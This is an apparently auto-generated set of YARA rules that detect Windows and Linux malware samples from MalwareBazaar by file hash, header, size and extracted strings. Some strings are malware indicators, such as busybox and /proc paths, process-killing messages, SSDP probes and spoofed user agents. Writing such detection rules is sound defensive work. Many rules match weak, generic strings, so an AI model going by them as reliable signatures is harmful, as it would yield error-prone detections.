rule Windows_4b0d7d7932c2361c099955820fefc4636459c3ea3b155746fc04a7193d96e5b3
{
    meta:
        description = "Auto ML: 4b0d7d7932c2361c099955820fefc4636459c3ea3b155746fc04a7193d96e5b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "fDKBST|LEFdNQIY^jZ_\\kOAFw}dtdJOs;vsO<rwK1~{G2z"
        $s5 = "C/fc_(bg[%nkW.joSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 217KB
        and all of them
}

rule Windows_4b44b1c08bf3bb9f1b9b215eb84c04144e79c4c024b34d5b8b0c8c9309126e71
{
    meta:
        description = "Auto ML: 4b44b1c08bf3bb9f1b9b215eb84c04144e79c4c024b34d5b8b0c8c9309126e71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Marmarized"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB
        and all of them
}

rule Windows_4b7763f16960cf7f830ba960eb39b6b7380570ae3e31dac228a5c378f6448ac1
{
    meta:
        description = "Auto ML: 4b7763f16960cf7f830ba960eb39b6b7380570ae3e31dac228a5c378f6448ac1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "tehI/@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_4b77afc2c93fc493b97111ad3e0cb3d1622483091855d5207f37ab9a8acb2d25
{
    meta:
        description = "Auto ML: 4b77afc2c93fc493b97111ad3e0cb3d1622483091855d5207f37ab9a8acb2d25"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2259KB
        and all of them
}

rule Windows_4b8ab8db41213f3a56759ff95b48e08ce9fb7ad52365a4977394913b217a22a9
{
    meta:
        description = "Auto ML: 4b8ab8db41213f3a56759ff95b48e08ce9fb7ad52365a4977394913b217a22a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 281KB
        and all of them
}

rule Linux_4b947ab8d5638b240d1bce0d46a9ddf17f8c6e383afd3eee8fb34524796fc046
{
    meta:
        description = "Auto ML: 4b947ab8d5638b240d1bce0d46a9ddf17f8c6e383afd3eee8fb34524796fc046"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "expand 32-byte k"
        $s2 = "google"
        $s3 = "objectClass0"
        $s4 = "service:service-agent"
        $s5 = "default"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB
        and all of them
}

rule Windows_05c917e096b3167792ade5691f4ca3b341e62fda93ec4943f08a76179fe67948
{
    meta:
        description = "Auto ML: 05c917e096b3167792ade5691f4ca3b341e62fda93ec4943f08a76179fe67948"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_4ba8be19b243c1ddcefe359a35c8bd3f8969cae00fffe575a44f60f98f473bad
{
    meta:
        description = "Auto ML: 4ba8be19b243c1ddcefe359a35c8bd3f8969cae00fffe575a44f60f98f473bad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "c=&C)`]TC"
        $s3 = "p22].dd0!. 9Y"
        $s4 = "X4ivd%"
        $s5 = ":-%!peOj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1839KB
        and all of them
}

rule Windows_4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb
{
    meta:
        description = "Auto ML: 4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.eh_fram"
        $s5 = "p< tBv <@t,<Pt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 306KB
        and all of them
}

rule Linux_4c031ad982f5d0ab2dc479c6b50303b52118a1e9d64d05fb31f2747f6b3f181f
{
    meta:
        description = "Auto ML: 4c031ad982f5d0ab2dc479c6b50303b52118a1e9d64d05fb31f2747f6b3f181f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "y$Qdl%"
        $s2 = "%od Nd"
        $s3 = "Sytm9$"
        $s4 = "xMxhYW"
        $s5 = "Uw+5pq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_4c062e33871e165914ef7883c4c82492b2e2d4623b30e0288d3c1ac9038f1e7f
{
    meta:
        description = "Auto ML: 4c062e33871e165914ef7883c4c82492b2e2d4623b30e0288d3c1ac9038f1e7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Linux_4c132411f397fcbe31a43a4b9bbe703e3329991c03dc444f9d608d7a0fefcd5f
{
    meta:
        description = "Auto ML: 4c132411f397fcbe31a43a4b9bbe703e3329991c03dc444f9d608d7a0fefcd5f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 193KB
        and all of them
}

rule Linux_4c2043697a99ead23aa6a17d11762ba9152be82812422eda8bb08dd1c450f881
{
    meta:
        description = "Auto ML: 4c2043697a99ead23aa6a17d11762ba9152be82812422eda8bb08dd1c450f881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"
        $s2 = "<!: acam"
        $s3 = "t#5't<1&1t8;8T"
        $s4 = "nt5$$81 t:; t2;!:0T"
        $s5 = "{6=:{6!'-6;,t?=88tymtT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 76KB
        and all of them
}

rule Windows_4c236256dbc5dba5926eda92e6400462301806828b2f56625cd32d1ad447358b
{
    meta:
        description = "Auto ML: 4c236256dbc5dba5926eda92e6400462301806828b2f56625cd32d1ad447358b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "j5P'.T>t.T>t.T>t0"
        $s3 = "Et-T>t.T?txT>t0"
        $s4 = "t/T>tRich.T>t"
        $s5 = "`.rdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 200KB
        and all of them
}

rule Linux_4c3482814c892877794407cde41e67efac2a37771b0b93f64a0e46cdb93718de
{
    meta:
        description = "Auto ML: 4c3482814c892877794407cde41e67efac2a37771b0b93f64a0e46cdb93718de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "K-iLOs"
        $s2 = "NYp%\\cL"
        $s3 = "w}YWpZC:b^"
        $s4 = "u_n}bY"
        $s5 = "pt)-o9U"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Linux_4c3b3a50bdbe6c9e313700510d826766c28f2eb8d1b20a0fa1c3fe458e107769
{
    meta:
        description = "Auto ML: 4c3b3a50bdbe6c9e313700510d826766c28f2eb8d1b20a0fa1c3fe458e107769"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/self/exe"
        $s2 = "/proc/"
        $s3 = "Killed process: PID=%d RealPath=%s"
        $s4 = "/bin/busybox"
        $s5 = "/usr/lib/systemd/systemd"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB
        and all of them
}

rule Windows_4c7690aae75b181a414129672bbad75d30883ac9f59ccede66b3b5789bd105b6
{
    meta:
        description = "Auto ML: 4c7690aae75b181a414129672bbad75d30883ac9f59ccede66b3b5789bd105b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Unrotted"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB
        and all of them
}

rule Windows_061e29f834b607e0f56113f3318890231346ac04a7fe24673989e10261fe55e1
{
    meta:
        description = "Auto ML: 061e29f834b607e0f56113f3318890231346ac04a7fe24673989e10261fe55e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 543KB
        and all of them
}

rule Windows_4c91634a53fddb78f1737e66c0c323cdbc8d2e720a14732b8336e449ce062319
{
    meta:
        description = "Auto ML: 4c91634a53fddb78f1737e66c0c323cdbc8d2e720a14732b8336e449ce062319"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB
        and all of them
}

rule Windows_4ca78845358393b899b27ea95fa11d04daa66763a2764dc8547230399cd41931
{
    meta:
        description = "Auto ML: 4ca78845358393b899b27ea95fa11d04daa66763a2764dc8547230399cd41931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS2H"
        $s4 = "diA/>K"
        $s5 = "uP)RM}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5888KB
        and all of them
}

rule Windows_4cb94e5cf28dc29ec74d5171838ec3735632812576708ec1bf1654b87b18215e
{
    meta:
        description = "Auto ML: 4cb94e5cf28dc29ec74d5171838ec3735632812576708ec1bf1654b87b18215e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 850KB
        and all of them
}

rule Linux_4cd40c12ab3331ac8adf456285a6106a93e1dee1870c7330b343003cb1c97ebe
{
    meta:
        description = "Auto ML: 4cd40c12ab3331ac8adf456285a6106a93e1dee1870c7330b343003cb1c97ebe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "09uhfU}y$"
        $s2 = "(Nqx:'qS"
        $s3 = "{T*+w{xe"
        $s4 = "w;#O6A_j"
        $s5 = "II=|TLEwU"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB
        and all of them
}

rule Windows_4d18c76bb688c0e0e5988c174d8cea453421b051c6c565ffe381c9537516cd30
{
    meta:
        description = "Auto ML: 4d18c76bb688c0e0e5988c174d8cea453421b051c6c565ffe381c9537516cd30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "L$HSUV"
        $s5 = "t$PWj@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2144KB
        and all of them
}

rule Windows_4d49c61647576d71405df122d55a461940ae46c11da96380ba1c6e5e042060bf
{
    meta:
        description = "Auto ML: 4d49c61647576d71405df122d55a461940ae46c11da96380ba1c6e5e042060bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.w0LY"
        $s5 = "fffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB
        and all of them
}

rule Linux_4da1443a2e9fbc8b88ef8d6653142568c586ddbeaa2dedeb743ca9cec3eb0552
{
    meta:
        description = "Auto ML: 4da1443a2e9fbc8b88ef8d6653142568c586ddbeaa2dedeb743ca9cec3eb0552"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "020sHMf"
        $s4 = "/so+Zc"
        $s5 = "lCm:`W"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB
        and all of them
}

rule Windows_4e01c76200fe5e4cde437fdd12b42c9d2c884018b7f9b89e097ff53ee4e75ec9
{
    meta:
        description = "Auto ML: 4e01c76200fe5e4cde437fdd12b42c9d2c884018b7f9b89e097ff53ee4e75ec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_4e0bbc36f494616d41b54f5c393ea04cc854645bde88cee145fbd58874f1b06c
{
    meta:
        description = "Auto ML: 4e0bbc36f494616d41b54f5c393ea04cc854645bde88cee145fbd58874f1b06c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".xidez"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB
        and all of them
}

rule Windows_4e531e34c8132457b497653d69f5efe16c95a651aa0a47e8ab8f56ad1f35b51d
{
    meta:
        description = "Auto ML: 4e531e34c8132457b497653d69f5efe16c95a651aa0a47e8ab8f56ad1f35b51d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "tabPage1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 704KB
        and all of them
}

rule Windows_061e427df3c58f2e4bd71c45494e5cb20786c2e5c40ff2f95df7f83475cba89a
{
    meta:
        description = "Auto ML: 061e427df3c58f2e4bd71c45494e5cb20786c2e5c40ff2f95df7f83475cba89a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 646KB
        and all of them
}

rule Windows_4e58387e1431f77f2fb4f103f82f7e5703daa02e039e352f05384c2ea300d103
{
    meta:
        description = "Auto ML: 4e58387e1431f77f2fb4f103f82f7e5703daa02e039e352f05384c2ea300d103"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "u>htnB"
        $s5 = "jXh0qB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 352KB
        and all of them
}

rule Windows_4e5eed42429be79e4a35d0e137149356319debf7e20ec9a8ca744564ddd95f43
{
    meta:
        description = "Auto ML: 4e5eed42429be79e4a35d0e137149356319debf7e20ec9a8ca744564ddd95f43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXhp?B"
        $s5 = "uBhB@@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB
        and all of them
}

rule Windows_4e77b03fc9937ac68121e3121cf062ba0994ba4aa06d2ccde468ce2a91cda61f
{
    meta:
        description = "Auto ML: 4e77b03fc9937ac68121e3121cf062ba0994ba4aa06d2ccde468ce2a91cda61f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 440KB
        and all of them
}

rule Windows_4e90cbff460414a9bd5b8ba2c9680bca2f85d3a38b4d2b2242f8c176d102f72f
{
    meta:
        description = "Auto ML: 4e90cbff460414a9bd5b8ba2c9680bca2f85d3a38b4d2b2242f8c176d102f72f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "Y;=hKB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB
        and all of them
}

rule Windows_4eabb95ac9e86f96dfc6489a64b98b736189c100f9328210e18197ac89b1e63d
{
    meta:
        description = "Auto ML: 4eabb95ac9e86f96dfc6489a64b98b736189c100f9328210e18197ac89b1e63d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff%"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 16040KB
        and all of them
}

rule Windows_4ec0dc97a22820f4d65d46424b991f5a8d84db9272d76a9801f5c31d299d42f3
{
    meta:
        description = "Auto ML: 4ec0dc97a22820f4d65d46424b991f5a8d84db9272d76a9801f5c31d299d42f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<NodesControl_MouseClick>b__47_10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 672KB
        and all of them
}

rule Windows_4efc9ad66b0d09b4e5ddae9e2c02bd112cb6e8cb7e9881969f231a10768b558f
{
    meta:
        description = "Auto ML: 4efc9ad66b0d09b4e5ddae9e2c02bd112cb6e8cb7e9881969f231a10768b558f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 937KB
        and all of them
}

rule Linux_4f0cceb59f469fb50bfbac4d269501407702bf8ac0c25fdce883cbbb1528b4e9
{
    meta:
        description = "Auto ML: 4f0cceb59f469fb50bfbac4d269501407702bf8ac0c25fdce883cbbb1528b4e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "/proc/net/route"
        $s5 = "(null)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB
        and all of them
}

rule Windows_4f1aa26efeafe6c4e92f7f15548fab6f23c42250d36c683cb5fa5bcfd4b8c751
{
    meta:
        description = "Auto ML: 4f1aa26efeafe6c4e92f7f15548fab6f23c42250d36c683cb5fa5bcfd4b8c751"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Inno<XJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4759KB
        and all of them
}

rule Windows_4f2139c9c1c42e293388deb00bcb9591162b58c8107e6cd8a317b40f93a6c836
{
    meta:
        description = "Auto ML: 4f2139c9c1c42e293388deb00bcb9591162b58c8107e6cd8a317b40f93a6c836"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 860KB
        and all of them
}

rule Linux_06206d8fb1ad3ffe39a98aa38f0bf424b5fd774e848b8417fb2e8d9be6cdbbb2
{
    meta:
        description = "Auto ML: 06206d8fb1ad3ffe39a98aa38f0bf424b5fd774e848b8417fb2e8d9be6cdbbb2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB
        and all of them
}

rule Windows_4f7a5d41b69c4b09f20a6a4d5113f51618f02f7ccf1393f931fdc34f99481b26
{
    meta:
        description = "Auto ML: 4f7a5d41b69c4b09f20a6a4d5113f51618f02f7ccf1393f931fdc34f99481b26"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "uRFGHt"
        $s5 = "t(ENEN;"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 896KB
        and all of them
}

rule Linux_4fa3d0afa237bc9278fe94334f06e60014a8e5dbabd3969a32b0cf8ceba1f765
{
    meta:
        description = "Auto ML: 4fa3d0afa237bc9278fe94334f06e60014a8e5dbabd3969a32b0cf8ceba1f765"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "u&&HHx"
        $s4 = "fFth D"
        $s5 = "hHx+fa"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Windows_4fad16bbb59875a3c26bb8b202abffd86217db7462463fece59db8f7aa0f99b9
{
    meta:
        description = "Auto ML: 4fad16bbb59875a3c26bb8b202abffd86217db7462463fece59db8f7aa0f99b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 160KB
        and all of them
}

rule Windows_4fe911ede9a29b44a66d87b13e1a2218bbd850a8dec352bdc92b25f8f0ba6fff
{
    meta:
        description = "Auto ML: 4fe911ede9a29b44a66d87b13e1a2218bbd850a8dec352bdc92b25f8f0ba6fff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "Y;=xkC"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 392KB
        and all of them
}

rule Windows_500216109d1c8e0795d241ce4c386483c504ddd19c0bff53e6c820456abb6214
{
    meta:
        description = "Auto ML: 500216109d1c8e0795d241ce4c386483c504ddd19c0bff53e6c820456abb6214"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5090KB
        and all of them
}

rule Windows_504e1940bd93e130262a7bd2b15fb622f178e2b533bfb5514ddc860ea164266d
{
    meta:
        description = "Auto ML: 504e1940bd93e130262a7bd2b15fb622f178e2b533bfb5514ddc860ea164266d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "__StaticArrayInitTypeSize=400"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 541KB
        and all of them
}

rule Linux_505e855170ca3ea5c80443e29f6ebbe9b8d96126205f5f020e7537cd9422cf06
{
    meta:
        description = "Auto ML: 505e855170ca3ea5c80443e29f6ebbe9b8d96126205f5f020e7537cd9422cf06"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x|cFp|c"
        $s2 = "T`X(}iJx|c"
        $s3 = "|iJxTc"
        $s4 = "X(}iJx"
        $s5 = "KxTi@.|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB
        and all of them
}

rule Windows_50933a6f60adfa71021386f9060bd9134b9023713ac2f38ec1587b6967442417
{
    meta:
        description = "Auto ML: 50933a6f60adfa71021386f9060bd9134b9023713ac2f38ec1587b6967442417"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "}2t@tEKu"
        $s5 = "uuh;Ex"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 866KB
        and all of them
}

